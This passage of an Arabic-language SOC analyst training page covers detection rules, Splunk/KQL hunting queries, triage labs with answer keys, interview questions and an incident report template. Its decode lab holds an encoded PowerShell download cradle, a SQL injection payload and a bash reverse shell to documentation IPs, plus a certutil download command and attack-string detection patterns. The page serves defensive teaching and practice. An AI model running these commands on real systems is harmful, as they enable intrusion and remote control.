+<div class="card"><h4>Static (من غير تشغيل)</h4><ul><li>Hashes (MD5/SHA256) → VT</li><li><code class="i">strings</code> / FLOSS (URLs, IPs, commands)</li><li>PE headers (PEStudio): imports زي <code class="i">VirtualAlloc</code>، <code class="i">CreateRemoteThread</code>، <code class="i">WriteProcessMemory</code> (Injection)</li><li>Packed? (Entropy عالي، UPX)</li><li>Digital signature</li><li>YARA rules</li></ul></div>
+<div class="card"><h4>Dynamic (تشغيل في Sandbox)</h4><ul><li>Process tree</li><li>Network (DNS، HTTP، IPs)</li><li>Files created/modified</li><li>Registry changes / persistence</li><li>أدوات: any.run، Joe Sandbox، Hybrid Analysis، Cuckoo/CAPE، Procmon، Process Hacker، Wireshark، Regshot</li><li>⚠️ Malware ذكي بيكشف الـ sandbox ويقعد ساكت (Evasion)</li></ul></div>
+</div>
+
+<h3>YARA و Sigma — اعرف الفرق</h3>
+<div class="grid2">
+<div class="card"><h4>YARA = للملفات (patterns)</h4>
+<pre>rule Suspicious_PS_Downloader {
+  meta:
+    author = "SOC"
+    description = "Encoded PowerShell downloader"
+  strings:
+    $a = "powershell" nocase
+    $b = "-enc" nocase
+    $c = "DownloadString" nocase
+    $d = "SQBFAFgA"          // IEX in UTF-16LE b64
+  condition:
+    $a and ($b or $c or $d)
+}</pre></div>
+<div class="card"><h4>Sigma = للـ Logs (generic، بيتحول لـ SPL/KQL)</h4>
+<pre>title: Office Application Spawning Shell
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith:
+      - '\winword.exe'
+      - '\excel.exe'
+      - '\outlook.exe'
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\mshta.exe'
+  condition: selection
+level: high
+tags: [attack.execution, attack.t1204.002]</pre></div>
+</div>
+<p><b>Snort/Suricata</b> = للـ Network traffic: <code class="i wrap">alert tcp any any -&gt; $HOME_NET 445 (msg:"SMB scan"; flags:S; threshold:type both, track by_src, count 50, seconds 10; sid:1000001; rev:1;)</code></p>
+</section>
+
+<!-- ===================== SIEM ===================== -->
+<section class="sec" id="siem">
+<header><h2><span class="num">15</span>SIEM Queries — Splunk SPL & Microsoft KQL</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<p class="muted">أسماء الـ fields بتختلف حسب الـ data source/TA — المهم إنك تفهم المنطق وتعرف تكتبه. لو اتسألت "اكتب query" اشرح منطقك بالكلام كمان.</p>
+
+<h3>Splunk SPL</h3>
+<pre><span class="c">// 1) Brute force: أكتر IPs عندها failed logons</span>
+index=wineventlog EventCode=4625
+| stats count AS failures dc(TargetUserName) AS users BY src_ip
+| where failures &gt; 20
+| sort - failures
+
+<span class="c">// 2) Password spraying: IP واحد جرّب يوزرات كتير</span>
+index=wineventlog EventCode=4625
+| bin _time span=10m
+| stats dc(TargetUserName) AS distinct_users count BY _time src_ip
+| where distinct_users &gt; 15
+
+<span class="c">// 3) Success بعد Failures (الأهم!)</span>
+index=wineventlog (EventCode=4625 OR EventCode=4624)
+| stats count(eval(EventCode=4625)) AS failed count(eval(EventCode=4624)) AS success BY src_ip TargetUserName
+| where failed &gt; 10 AND success &gt; 0
+
+<span class="c">// 4) Encoded PowerShell (Sysmon)</span>
+index=sysmon EventCode=1 Image="*\\powershell.exe"
+  (CommandLine="* -enc*" OR CommandLine="* -e *" OR CommandLine="*FromBase64String*")
+| table _time host User ParentImage CommandLine
+
+<span class="c">// 5) Office spawning shells</span>
+index=sysmon EventCode=1 (ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe" OR ParentImage="*\\outlook.exe")
+  (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\wscript.exe" OR Image="*\\mshta.exe")
+
+<span class="c">// 6) New service / log cleared / user added to admins</span>
+index=wineventlog (EventCode=7045 OR EventCode=1102 OR EventCode=4720 OR EventCode=4732)
+| table _time host EventCode user Service_Name Service_File_Name Group_Name
+
+<span class="c">// 7) Beaconing (تقريبي): فترات منتظمة بين الاتصالات</span>
+index=proxy
+| sort 0 _time
+| streamstats current=f last(_time) AS prev BY src_ip dest_host
+| eval delta=_time-prev
+| stats count avg(delta) AS avg_gap stdev(delta) AS jitter BY src_ip dest_host
+| where count &gt; 50 AND jitter &lt; 5
+
+<span class="c">// 8) Web attacks في access logs</span>
+index=web sourcetype=access_combined
+| regex uri="(?i)(union.+select|sleep\(|%27|\.\./|etc/passwd|&lt;script|onerror=|\$\{jndi:)"
+| stats count values(uri) AS samples BY clientip useragent
+
+<span class="c">// 9) Rare domains (محدش تاني زارها)</span>
+index=proxy | stats dc(src_ip) AS hosts count BY dest_host | where hosts=1 | sort - count</pre>
+
+<h3>Microsoft Sentinel / Defender — KQL</h3>
+<pre><span class="c">// 1) Brute force</span>
+SecurityEvent
+| where EventID == 4625
+| summarize Failures = count(), Users = dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 10m)
+| where Failures &gt; 20
+
+<span class="c">// 2) Office → Shell (Defender for Endpoint)</span>
+DeviceProcessEvents
+| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
+| where FileName in~ ("powershell.exe","cmd.exe","wscript.exe","mshta.exe","rundll32.exe")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
+
+<span class="c">// 3) LSASS dump via comsvcs</span>
+DeviceProcessEvents
+| where FileName =~ "rundll32.exe" and ProcessCommandLine has_all ("comsvcs", "MiniDump")
+
+<span class="c">// 4) Kerberoasting</span>
+SecurityEvent
+| where EventID == 4769 and TicketEncryptionType == "0x17"
+| summarize SPNs = dcount(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 1h)
+| where SPNs &gt; 5
+
+<span class="c">// 5) Entra ID: Impossible travel / sign-ins من دول كتير</span>
+SigninLogs
+| where ResultType == 0
+| summarize Countries = make_set(LocationDetails.countryOrRegion), IPs = make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)
+| where array_length(Countries) &gt; 1
+
+<span class="c">// 6) Clicked on phishing URL (Defender for Office)</span>
+UrlClickEvents
+| where Url has "m365-verify-login"
+| project Timestamp, AccountUpn, Url, ActionType, IsClickedThrough</pre>
+
+<h3>Elastic / Wazuh (KQL/Lucene) سريع</h3>
+<pre>event.code:4625 and source.ip:*                         process.name:"powershell.exe" and process.command_line:*enc*
+url.original:*UNION* or url.original:*%27*             dns.question.name:*.cdn-sync-api.example</pre>
+</section>
+
+<!-- ===================== LABS ===================== -->
+<section class="sec" id="labs">
+<header><h2><span class="num">16</span>Practice Labs — 13 سيناريو</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<p>الـ Labs من 1 لـ 9 موجودة جوه الأقسام (ومترابطة ببعض كأنها <b>Incident واحد كبير</b> — جرّب تربطهم!). والـ Labs من 10 لـ 13 تحت.</p>
+<div class="tbl"><table>
+<tr><th>#</th><th>Lab</th><th>المهارة</th></tr>
+<tr><td>1-3</td><td><a href="#phishing">Phishing: Credential harvest / BEC / Macro</a></td><td>Headers، SPF/DKIM/DMARC، Social engineering</td></tr>
+<tr><td>4</td><td><a href="#proxy">Proxy: مين داس ومين اتصاب</a></td><td>POST/302، Beaconing، Exfil</td></tr>
+<tr><td>5</td><td><a href="#firewall">Firewall: 5 Patterns</a></td><td>Scans، Exfil، Misconfig</td></tr>
+<tr><td>6</td><td><a href="#edr">EDR Process Tree</a></td><td>Parent/Child، LOLBins، MITRE</td></tr>
+<tr><td>7</td><td><a href="#winevents">Windows Events Timeline</a></td><td>RDP brute → Ransomware</td></tr>
+<tr><td>8</td><td><a href="#dns">DNS Tunneling / DGA / FP</a></td><td>Anomaly detection</td></tr>
+<tr><td>9</td><td><a href="#web">Web Attack Chain</a></td><td>SQLi → Web shell</td></tr>
+</table></div>
+<div class="callout idea"><b class="t">🧠 Mega-Challenge (تفكير خارج الصندوق)</b>
+لو ربطت الـ Labs كلها هتلاقي إن المهاجم <code class="i">203.0.113.66</code> عمل scan ثم اخترق الـ web server، وفي نفس الوقت حملة Phishing ضربت ahmed (credentials) و sara (malware + C2 + exfil + lateral movement على 445)، وفي الليل RDP المفتوح اتضرب بـ Ransomware. <b>جرّب تكتب Timeline موحد + Executive Summary في 10 سطور</b> — ده بالظبط نوع التفكير اللي بيميز L1 قوي عن L1 عادي: إنك تشوف الـ "Big picture" ومش كل alert لوحده.
+</div>
+
+<!-- Lab 10 -->
+<div class="lab">
+<div class="lt">🧪 Lab 10: Quick Triage — TP / FP / Benign TP؟</div>
+<ol>
+<li><b>Alert:</b> "Port scan detected" من <code class="i">10.10.1.5</code> على كل الـ subnet، يوم الثلاث الساعة 2 الصبح. الجهاز ده اسمه <code class="i">NESSUS-SCN01</code>.</li>
+<li><b>Alert:</b> "Impossible travel" — اليوزر دخل من القاهرة 09:00 ومن هولندا 09:20.</li>
+<li><b>Alert:</b> <code class="i">powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\script.ps1</code> parent = <code class="i">CcmExec.exe</code>.</li>
+<li><b>Alert:</b> <code class="i">certutil.exe -urlcache -split -f http://198.51.100.77/a.txt C:\Users\Public\a.exe</code> — parent = <code class="i">cmd.exe</code> ← <code class="i">explorer.exe</code>.</li>
+<li><b>Alert:</b> 60 failed logon (4625، 0xC000006A) لـ <code class="i">mona.adel</code> من موبايلها على Exchange ActiveSync، بعد ما غيرت الباسورد الصبح.</li>
+<li><b>Alert:</b> "Mass download" — يوزر في الـ HR نزّل 4,000 ملف من SharePoint الساعة 11 بالليل، وهو مقدم استقالته من أسبوع.</li>
+</ol>
+<details class="ans"><summary>اظهر الإجابات</summary><div class="body">
+<ol>
+<li><span class="badge b-yel">Benign True Positive</span> — Vulnerability scanner معروف في scan window. <b>بس</b> اتأكد مع فريق الـ IT إن ده scheduled فعلاً، واعمل exclusion محدد (IP + الوقت) مش whitelist مفتوح.</li>
+<li><b>محتاج تحقيق:</b> شيك هل الشركة بتستخدم VPN/Proxy cloud بيطلع من هولندا (Zscaler/Netskope؟) ← FP. لو لأ: نفس الـ device/browser؟ MFA اتعمل إزاي؟ فيه inbox rules جديدة؟ ← غالباً <span class="badge b-red">Account compromise</span> (AiTM). القرار مايتاخدش من اسم الـ alert.</li>
+<li>غالباً <span class="badge b-green">Benign</span> — SCCM/ConfigMgr agent بيشغل scripts بالشكل ده. لكن افتح الـ script / hash وشوف هو موقّع ومن الـ admins المعروفين (المهاجمين بيستغلوا SCCM برضه).</li>
+<li><span class="badge b-red">True Positive</span> — certutil بيستخدم كـ downloader، الملف <code class="i">.txt</code> بيتحفظ كـ <code class="i">.exe</code> في Public، ونفس IP الـ C2. T1105 + T1036. Isolate.</li>
+<li><span class="badge b-green">False Positive / Benign</span> — الموبايل لسه بيحاول بالباسورد القديم (stale credentials). كلّمها تحدّث الباسورد على الموبايل. (لكن اتأكد إن الـ IP فعلاً بتاعها/الـ ActiveSync device ID معروف.)</li>
+<li><span class="badge b-red">Insider Threat محتمل</span> — Data exfiltration قبل المغادرة. Escalate لـ L2 + HR/Legal حسب الـ policy، DLP review، ومايتعملش confront مباشر من الـ SOC.</li>
+</ol>
+</div></details>
+</div>
+
+<!-- Lab 11 -->
+<div class="lab">
+<div class="lt">🧪 Lab 11: Decode Challenge</div>
+<p>فك الـ 3 دول (استخدم <a href="#tools">الأداة</a> أو دماغك) وقول بيعملوا إيه:</p>
+<pre>(a) powershell -w 1 -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhAC4AcABzADEAJwApAA==
+(b) GET /api/item?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-
+(c) echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjIzLzQ0NDQgMD4mMQ== | base64 -d | bash</pre>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ol type="a">
+<li><code class="i">IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')</code> ← <b>Fileless</b>: بينزّل script ويشغله في الميموري مباشرة (مش بيتحفظ على الديسك). <code class="i">-w 1</code> = WindowStyle Hidden (1 = Hidden). T1059.001 + T1105 + T1027.</li>
+<li><code class="i">1' UNION SELECT username,password FROM users-- -</code> ← UNION-based SQLi لسحب الـ credentials. شوف الـ response size.</li>
+<li><code class="i">bash -i &gt;&amp; /dev/tcp/198.51.100.23/4444 0&gt;&amp;1</code> ← <b>Reverse shell</b> لـ 198.51.100.23 على port 4444 (Metasploit/netcat listener).</li>
+</ol>
+</div></details>
+</div>
+
+<!-- Lab 12 -->
+<div class="lab">
+<div class="lt">🧪 Lab 12: Password Spraying ولا Brute Force؟</div>
+<pre>Time      EventID  TargetUserName   IpAddress       SubStatus     Workstation
+07:00:01  4625     a.hassan         198.51.100.140  0xC000006A    -
+07:00:02  4625     m.ibrahim        198.51.100.140  0xC000006A    -
+07:00:02  4625     s.nabil          198.51.100.140  0xC000006A    -
+07:00:03  4625     o.farouk         198.51.100.140  0xC000006A    -
+07:00:03  4625     ceo.office       198.51.100.140  0xC0000064    -
+  ... (420 يوزر مختلف، محاولة واحدة لكل يوزر)
+07:06:40  4624     h.mostafa        198.51.100.140  -             -     LogonType 3, NTLM
+07:31:00  4625     a.hassan         198.51.100.140  0xC000006A    -     (الجولة التانية بعد 30 دقيقة)</pre>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<p><b>Password Spraying</b> (T1110.003): IP واحد، 420 يوزر مختلف، <b>محاولة واحدة لكل يوزر</b>، وجولات كل ~30 دقيقة (عشان يفلت من Lockout threshold/observation window). <code class="i">0xC000006A</code> = اليوزرات دي حقيقية (المهاجم عنده قائمة صحيحة — غالباً من LinkedIn/OSINT). <code class="i">0xC0000064</code> لـ ceo.office = تخمين اسم مش موجود.</p>
+<p><b>🚨 h.mostafa نجح</b> (4624 Type 3 NTLM) = حسابه اتسرق بالباسورد الضعيف (Season+Year!). <b>Actions:</b> Disable/reset h.mostafa فوراً، Block IP، راجع كل نشاط h.mostafa بعد 07:06، Force reset للي عندهم باسوردات ضعيفة، MFA، Smart lockout، Banned password list.</p>
+</div></details>
+</div>
+
+<!-- Lab 13 -->
+<div class="lab">
+<div class="lt">🧪 Lab 13: Cloud Email Compromise (AiTM → BEC)</div>
+<pre>[Entra ID SigninLogs]
+09:14:02  ahmed.ali@company.com  IP 10.10.5.23 (Cairo, corp)     App: OfficeHome  Result: Success  MFA: Microsoft Authenticator push
+09:14:09  ahmed.ali@company.com  IP 198.51.100.88 (VPS, NL)      App: OfficeHome  Result: Success  <span class="r">MFA: "MFA requirement satisfied by claim in the token"</span>  UA: Chrome/131 Linux
+[Exchange Audit / UnifiedAuditLog]
+09:20:31  ahmed.ali  <span class="r">New-InboxRule  Name: "."  SubjectOrBodyContainsWords: "invoice","payment","bank"  MoveToFolder: "RSS Feeds"  MarkAsRead: True</span>
+09:25:10  ahmed.ali  Set-Mailbox  ForwardingSmtpAddress: smtp:archive.ahmed@mail.example
+09:40:55  ahmed.ali  Send  To: 37 external contacts  Subject: "Updated bank details for Q4 payments"</pre>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ul>
+<li><b>AiTM phishing</b> (Evilginx-style): نفس الثانية تقريباً فيه login حقيقي من جهاز أحمد + login من VPS في هولندا بنفس الـ session — والـ MFA "satisfied by claim in the token" = المهاجم <b>سرق الـ session cookie</b> فمحتاجش MFA تاني. (ده أكمل اللي حصل في Proxy Lab — أحمد عمل POST للصفحة المزيفة.)</li>
+<li><b>Persistence & Evasion:</b> Inbox rule باسم "<code class="i">.</code>" (مايبانش) بتخبي أي رد فيه invoice/payment في RSS Feeds = <b>عشان أحمد مايشوفش ردود الضحايا</b> (T1564.008). + Forwarding لإيميل خارجي (T1114.003).</li>
+<li><b>BEC / Internal-to-External phishing:</b> بعت لـ 37 جهة "تحديث بيانات بنكية" ← احتيال مالي من حساب حقيقي (ثقة عالية جداً).</li>
+</ul>
+<p><b>Actions:</b> <b>Revoke all sessions/refresh tokens</b> (Reset password لوحده مش كفاية!)، Reset password، امسح الـ inbox rule والـ forwarding، راجع MFA methods (المهاجم ممكن يضيف authenticator بتاعه)، Block 198.51.100.88، ابعت تحذير للـ 37 جهة فوراً، Conditional Access (compliant device / phishing-resistant MFA زي FIDO2)، Purge الإيميلات اللي اتبعتت.</p>
+</div></details>
+</div>
+</section>
+
+<!-- ===================== INTERVIEW ===================== -->
+<section class="sec" id="interview">
+<header><h2><span class="num">17</span>أسئلة الإنترفيو/الـ Assessment الشائعة + إجابات نموذجية</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<p>حاول تجاوب بصوت عالي الأول، وبعدين افتح الإجابة.</p>
+
+<h3>Networking</h3>
+<details><summary>إيه اللي بيحصل لما تكتب google.com في المتصفح؟</summary><div class="body">DNS resolution (cache → resolver → root → TLD → authoritative) ← TCP 3-way handshake على 443 ← TLS handshake (SNI، certificate validation) ← HTTP GET ← السيرفر يرد ← المتصفح يعمل render ويطلب الـ resources. وعلى الطريق: ARP للـ gateway، NAT، Proxy/Firewall.</div></details>
+<details><summary>TCP vs UDP؟ وأمثلة؟</summary><div class="body">TCP: connection-oriented، reliable، ordered (HTTP، SSH، SMB). UDP: connectionless، أسرع، بدون ضمان (DNS، DHCP، VoIP، streaming). DNS بيستخدم TCP لما الرد كبير أو Zone transfer.</div></details>
+<details><summary>الفرق بين IDS و IPS؟ و Firewall و WAF؟</summary><div class="body">IDS بيكتشف وينبه (passive)، IPS inline وبيمنع. Firewall بيشتغل على L3/L4 (IP/Port) والـ NGFW بيوصل لـ L7. WAF متخصص في حماية الـ web apps من SQLi/XSS على L7.</div></details>
+<details><summary>Port 445 / 3389 / 53 / 88؟ وليه تهمّنا؟</summary><div class="body">445 SMB (WannaCry، lateral movement، مايتفتحش للإنترنت). 3389 RDP (brute force، ransomware initial access). 53 DNS (tunneling). 88 Kerberos (Kerberoasting، Golden ticket).</div></details>
+<details><summary>Stateful vs Stateless firewall؟</summary><div class="body">Stateful بيتابع حالة الـ connection (يعرف إن الرد ده تابع لطلب خرج) فمش محتاج rule للرد. Stateless بيفحص كل packet لوحده (زي ACLs).</div></details>
+
+<h3>Security Concepts</h3>
+<details><summary>إيه هو الـ False Positive وإزاي تقلله؟</summary><div class="body">Alert على نشاط طبيعي. تقليله: Tuning للـ rule (thresholds، exclusions محددة)، Context (asset inventory، user roles)، Correlation مع مصادر تانية، Feedback loop مع الـ detection engineering. والأخطر منه الـ False Negative.</div></details>
+<details><summary>Encoding vs Encryption vs Hashing؟</summary><div class="body">Encoding لتغيير الشكل بدون key (Base64). Encryption للسرية وبيحتاج key وقابل للعكس (AES/RSA). Hashing one-way للـ integrity (SHA-256). الباسوردات بتتخزن Hash + Salt.</div></details>
+<details><summary>Vulnerability vs Threat vs Risk؟</summary><div class="body">Vulnerability = ضعف. Threat = حاجة ممكن تستغله. Risk = احتمال الاستغلال × الأثر. مثال: سيرفر مش متحدّث (vuln) + ransomware gang (threat) = risk عالي لو السيرفر critical.</div></details>
+<details><summary>اشرح MITRE ATT&amp;CK والـ Cyber Kill Chain والفرق بينهم.</summary><div class="body">Kill Chain = 7 مراحل خطية عالية المستوى للهجوم. ATT&amp;CK = knowledge base مفصّل بـ 14 Tactic (الهدف) وتحت كل واحدة Techniques/Sub-techniques (الطريقة) مبني على هجمات حقيقية، مش لازم خطي. بنستخدمه في الـ mapping، الـ detection coverage، والـ threat hunting.</div></details>
+<details><summary>SIEM vs SOAR vs EDR vs XDR؟</summary><div class="body">SIEM يجمع ويربط logs ويطلع alerts. SOAR يعمل automation للـ response (playbooks). EDR مراقبة واستجابة على الـ endpoints. XDR بيوسّع EDR لمصادر تانية (email، identity، cloud، network) في منصة واحدة.</div></details>
+<details><summary>IOC vs IOA؟</summary><div class="body">IOC دليل إن اختراق حصل (hash، IP، domain) — reactive. IOA سلوك بيدل إن هجوم شغال (Word بيشغل PowerShell) — proactive وأصعب على المهاجم يغيره (Pyramid of Pain).</div></details>
+<details><summary>إيه هو Zero Trust؟</summary><div class="body">"Never trust, always verify": مفيش ثقة تلقائية بناءً على مكانك في الشبكة. كل request يتأكد (identity، device health، context)، Least privilege، Micro-segmentation، Assume breach.</div></details>
+<details><summary>Symmetric vs Asymmetric encryption؟</summary><div class="body">Symmetric مفتاح واحد للتشفير والفك (AES) — سريع. Asymmetric زوج مفاتيح public/private (RSA/ECC) — بطيء، بيستخدم لتبادل المفاتيح والتوقيعات. TLS بيستخدم الاتنين: asymmetric لتبادل المفتاح ثم symmetric للبيانات.</div></details>
+
+<h3>Scenarios (الأهم)</h3>
+<details><summary>يوزر بلّغ عن إيميل مريب — هتعمل إيه خطوة بخطوة؟</summary><div class="body">1) خد الإيميل كـ .eml (مش screenshot). 2) حلل الـ headers (sender، return-path، reply-to، SPF/DKIM/DMARC، originating IP). 3) حلل الـ URLs/attachments في sandbox/urlscan/VT من غير ما تفتحها. 4) Verdict. 5) لو malicious: search عن كل المستلمين ← purge ← block IOCs ← شوف في proxy/EDR مين داس أو شغّل ← reset/isolate للمتأثرين. 6) Document + شكر اليوزر (عشان يفضل يبلّغ).</div></details>
+<details><summary>يوزر داس على لينك Phishing ودخل الباسورد — إيه الـ Actions؟</summary><div class="body">Reset password + <b>revoke sessions/tokens</b> فوراً، راجع sign-in logs من وقت الدخول (IPs غريبة، دول)، شيك على MFA methods جديدة، inbox rules/forwarding، أي إيميلات اتبعتت من الحساب، OAuth apps اتعملها consent، وشوف لو نفس الباسورد مستخدم في مكان تاني. Block الـ phishing domain.</div></details>
+<details><summary>جالك alert إن جهاز بيكلم IP معروف إنه C2 — تعمل إيه؟</summary><div class="body">Validate (الـ IP فعلاً malicious؟ TI sources، امتى اتصنف). شوف الـ process اللي عمل الاتصال على EDR (process tree، command line، hash، parent). نطاق الاتصال (beaconing؟ bytes؟ امتى بدأ؟). لو confirmed: isolate، اجمع evidence، block IOC، hunt على باقي الأجهزة، اعرف الـ initial access، eradicate، reimage.</div></details>
+<details><summary>إزاي تفرق بين Brute force و Password spraying في اللوج؟</summary><div class="body">Brute force: يوزر واحد، باسوردات كتير، غالباً lockout (4740). Spraying: يوزرات كتير، محاولة أو اتنين لكل واحد، من نفس المصدر، على فترات. الاتنين 4625 بس الـ pattern مختلف (dc(TargetUserName)).</div></details>
+<details><summary>إزاي تعرف إن SQL injection نجح من الـ access log؟</summary><div class="body">Response size أكبر من الطبيعي بعد UNION، status 200 بعد أخطاء 500 (تحسين الـ payload)، تأخير زمني ثابت مع SLEEP، و follow-up: login ناجح للـ admin بعدها، upload، web shell. وأكد من DB logs / WAF / app logs.</div></details>
+<details><summary>Ransomware alert على سيرفر — أول 15 دقيقة؟</summary><div class="body">Isolate فوراً (network، مش shutdown لو ممكن عشان الميموري)، Escalate للـ IR/management، حدد النطاق (كام جهاز بيتشفر، share إيه)، Disable الحسابات المستخدمة، Block IOCs، احمي الـ backups (افصلها)، اجمع evidence (ransom note، sample، logs)، ماتدفعش وماتتواصلش مع المهاجم من غير قرار إداري/قانوني.</div></details>
+<details><summary>لقيت PowerShell بـ -enc — ماذا تفعل؟</summary><div class="body">Decode (Base64 → UTF-16LE). شوف الـ parent process (Office؟ SCCM؟). شوف Event 4104 للكود الكامل. استخرج IOCs (URLs، IPs). شوف network/file activity بعده. Verdict حسب السياق — مش كل -enc خبيث (بعض أدوات الإدارة بتستخدمه).</div></details>
+<details><summary>إيه اللي تعمله لو مش متأكد من Verdict؟</summary><div class="body">ماتقفلش الـ alert كـ FP. وثّق اللي لقيته والناقص، اجمع context إضافي (اسأل صاحب الجهاز/الـ IT)، Escalate لـ L2 بملخص واضح. الـ escalation الصح مش ضعف — الإغلاق الغلط هو الكارثة.</div></details>
+<details><summary>إزاي تعمل Threat Hunting؟</summary><div class="body">Hypothesis-driven: "لو مهاجم عمل X هيبان إزاي؟" (مثلاً: rundll32 بدون arguments عامل network). استخدم MITRE + TI + baseline للطبيعي، دوّر على الـ anomalies (rare processes، rare domains، stacking/long-tail analysis)، ولو لقيت حاجة → IR، ولو لأ → حوّل الـ hunt لـ detection rule.</div></details>
+
+<h3>Windows / AD</h3>
+<details><summary>إيه هو LSASS وليه المهاجمين بيستهدفوه؟</summary><div class="body">Local Security Authority Subsystem Service — بيتعامل مع الـ authentication وبيحتفظ بالـ credentials (hashes، tickets، أحياناً cleartext) في الميموري. Dump ليه (Mimikatz، procdump، comsvcs) = سرقة credentials للـ lateral movement. الحماية: Credential Guard، LSA Protection (RunAsPPL)، ASR rules.</div></details>
+<details><summary>اشرح Kerberoasting وإزاي تكشفه.</summary><div class="body">أي domain user يقدر يطلب service ticket لأي SPN؛ التذكرة مشفرة بـ hash حساب الـ service، فالمهاجم يكسرها offline. Detection: 4769 بـ encryption 0x17 (RC4)، يوزر بيطلب tickets لـ SPNs كتير. Mitigation: باسوردات طويلة للـ service accounts (gMSA)، AES only.</div></details>
+<details><summary>Pass-the-Hash إزاي بيشتغل؟</summary><div class="body">NTLM بيقبل الـ hash بدل الباسورد، فالمهاجم اللي سرق NTLM hash يقدر يعمل authenticate من غير ما يعرف الباسورد. Detection: 4624 Logon Type 9 + seclogo، أو NTLM type 3 logons غير معتادة. Mitigation: LAPS، تقليل NTLM، Protected Users، Tiering.</div></details>
+<details><summary>إيه Event ID لـ: Log cleared / Service installed / User added to admins / Scheduled task؟</summary><div class="body">1102 / 7045 (و 4697) / 4732 (local) أو 4728 (global) أو 4756 (universal) / 4698.</div></details>
+
+<h3>Soft / Behavioral</h3>
+<details><summary>ليه عايز تشتغل SOC Analyst؟</summary><div class="body">ركّز على: الشغف بالتحقيق وحل الألغاز، التعلم المستمر (كل يوم هجمات جديدة)، الأثر المباشر في حماية الشركة، وإنها البوابة لـ IR/Threat Hunting/Detection Engineering. واذكر حاجة عملتها فعلاً (TryHackMe SOC Level 1، LetsDefend، CyberDefenders، home lab بـ Wazuh/Splunk).</div></details>
+<details><summary>إزاي تتعامل مع Alert fatigue / Shift تقيل؟</summary><div class="body">Prioritization حسب severity و asset criticality، اقتراح tuning للـ noisy rules، automation للمهام المتكررة (SOAR)، توثيق جيد، والتواصل مع الفريق. وقت الضغط: الهدوء + اتباع الـ playbook.</div></details>
+<details><summary>إزاي بتتابع الجديد في الـ Security؟</summary><div class="body">The DFIR Report، BleepingComputer، The Hacker News، CISA advisories/KEV، MITRE updates، SANS ISC، Twitter/X و LinkedIn للباحثين، Podcasts (Darknet Diaries)، والمنصات العملية (LetsDefend/CyberDefenders/TryHackMe).</div></details>
+</section>
+
+<!-- ===================== FLASHCARDS ===================== -->
+<section class="sec" id="flash">
+<header><h2><span class="num">18</span>Flashcards — راجع بسرعة</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<p>دوس على الكارت عشان تشوف الإجابة. <span class="kbd">Space</span> قلب الكارت · <span class="kbd">→</span>/<span class="kbd">←</span> التالي.</p>
+<div class="toolbar">
+  <select class="btn" id="fcCat"><option value="all">كل الفئات</option></select>
+  <button class="btn" id="fcPrev">→ السابق</button>
+  <button class="btn primary" id="fcNext">التالي ←</button>
+  <button class="btn" id="fcShuffle">🔀 Shuffle</button>
+  <span class="muted" id="fcCount" style="align-self:center;font-size:13px"></span>
+</div>
+<div class="fc" id="fc" tabindex="0"><div><div class="cat" id="fcC"></div><div class="q" id="fcQ"></div><div class="a" id="fcA"></div></div></div>
+</section>
+
+<!-- ===================== REPORT ===================== -->
+<section class="sec" id="report">
+<header><h2><span class="num">19</span>Incident Report Template (انسخه واستخدمه في الإجابة)</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+<pre>INCIDENT REPORT — [Title, e.g. "Credential Phishing leading to Account Compromise"]
+Ticket ID: INC-XXXX        Analyst: ______        Date/Time (UTC): ______
+Severity: High             Status: Contained / Open        Verdict: True Positive
+
+1. EXECUTIVE SUMMARY (2–3 sentences, non-technical)
+   On 20-Nov-2026 at 08:14 UTC, a phishing email impersonating Microsoft 365 was delivered to 23 users.
+   One user (ahmed.ali) submitted credentials; the account was accessed from an external IP. The account
+   has been secured and the email purged. No evidence of data exfiltration from this account was found.
+
+2. TIMELINE (UTC)
+   08:14:22  Email delivered from security@micros0ft-support[.]com (IP 203.0.113[.]45)
+   08:21:47  ahmed.ali POST credentials to hxxps://m365-verify-login[.]web[.]app/owa/submit.php
+   09:14:09  Successful sign-in from 198.51.100[.]88 (NL) using stolen session token
+   09:20:31  Malicious inbox rule "." created
+   10:05:00  SOC: sessions revoked, password reset, rule removed, IOCs blocked
+
+3. ANALYSIS / EVIDENCE
+   - SPF fail, DKIM none, DMARC none; lookalike domain registered 2 days before
+   - Link text ≠ href; credential harvesting page hosted on free hosting
+   - Proxy log shows POST + 302 redirect from 10.10.5.23 (ahmed.ali)
+   - Sign-in logs: MFA satisfied by token claim → AiTM session hijack
+
+4. INDICATORS OF COMPROMISE (defanged)
+   Domains : micros0ft-support[.]com, mail-secure-notify[.]top, m365-verify-login[.]web[.]app
+   IPs     : 203.0.113[.]45, 198.51.100[.]88
+   URLs    : hxxps://m365-verify-login[.]web[.]app/owa/
+   Email   : security@micros0ft-support[.]com    Subject: "[ACTION REQUIRED] Your mailbox will be suspended..."
+
+5. MITRE ATT&amp;CK
+   T1566.002 Spearphishing Link → T1557 AiTM → T1078.004 Cloud Accounts → T1564.008 Email Hiding Rules
+
+6. SCOPE &amp; IMPACT
